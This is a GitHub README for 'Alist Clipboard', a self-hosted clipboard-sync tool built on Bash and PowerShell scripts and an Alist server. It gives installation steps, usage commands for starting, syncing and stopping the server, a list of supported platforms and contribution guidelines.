# Alist Clipboard ✂️

![GitHub Repo stars](https://img.shields.io/github/stars/KIOKO-2006/alist_clipboard?style=social)
![GitHub Repo forks](https://img.shields.io/github/forks/KIOKO-2006/alist_clipboard?style=social)
![GitHub license](https://img.shields.io/github/license/KIOKO-2006/alist_clipboard)

## Overview

Welcome to **Alist Clipboard**! This repository offers a cross-platform solution for clipboard synchronization using the Alist server. Share clipboard content between devices without relying on third-party services. Built entirely with shell scripts (Bash/PowerShell), this tool has minimal system dependencies, making it lightweight and efficient.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Supported Platforms](#supported-platforms)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Features

- **Cross-Platform**: Works on Linux, Windows, and other platforms.
- **Lightweight**: Minimal system requirements and dependencies.
- **Privacy-Focused**: No third-party services involved.
- **Self-Hosted**: Control your clipboard data on your own server.
- **Easy to Use**: Simple shell scripts for straightforward operation.
- **Clipboard Manager**: Synchronize clipboard content seamlessly across devices.

## Installation

To get started with Alist Clipboard, follow these steps:

1. **Download the latest release** from the [Releases section](https://github.com/KIOKO-2006/alist_clipboard/releases). You will need to download and execute the appropriate file for your operating system.
2. **Extract the files** to a directory of your choice.
3. **Run the installation script**:
   - For Linux:
     ```bash
     ./install.sh
     ```
   - For Windows:
     ```powershell
     .\install.ps1
     ```

Make sure you have the necessary permissions to execute the scripts.

## Usage

Once installed, you can start using Alist Clipboard to synchronize your clipboard. Here’s how:

1. **Start the Alist server**:
   - For Linux:
     ```bash
     ./start_server.sh
     ```
   - For Windows:
     ```powershell
     .\start_server.ps1
     ```

2. **Copy content** to your clipboard as you normally would.

3. **Sync your clipboard** across devices:
   - Use the command:
     ```bash
     ./sync_clipboard.sh
     ```
   - This command will sync your clipboard content with the Alist server.

4. **To stop the server**, use:
   - For Linux:
     ```bash
     ./stop_server.sh
     ```
   - For Windows:
     ```powershell
     .\stop_server.ps1
     ```

## Supported Platforms

Alist Clipboard supports the following platforms:

- **Linux**: Tested on Ubuntu, Fedora, and Debian.
- **Windows**: Compatible with Windows 10 and later versions.
- **macOS**: Works with Bash; some scripts may need adjustments.

## Contributing

We welcome contributions! If you would like to contribute to Alist Clipboard, please follow these steps:

1. **Fork the repository** on GitHub.
2. **Create a new branch** for your feature or bug fix.
3. **Make your changes** and commit them with clear messages.
4. **Push your changes** to your forked repository.
5. **Submit a pull request** to the main repository.

For larger changes, consider opening an issue first to discuss your ideas.

## License

Alist Clipboard is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or support, please reach out to the maintainer:

- **GitHub**: [KIOKO-2006](https://github.com/KIOKO-2006)

## Conclusion

Alist Clipboard is a simple yet powerful tool for clipboard synchronization. With its lightweight design and focus on privacy, it allows you to share clipboard content across devices seamlessly. 

To get started, download the latest release from the [Releases section](https://github.com/KIOKO-2006/alist_clipboard/releases) and execute the necessary files. Enjoy your clipboard synchronization experience!

Happy syncing! 🎉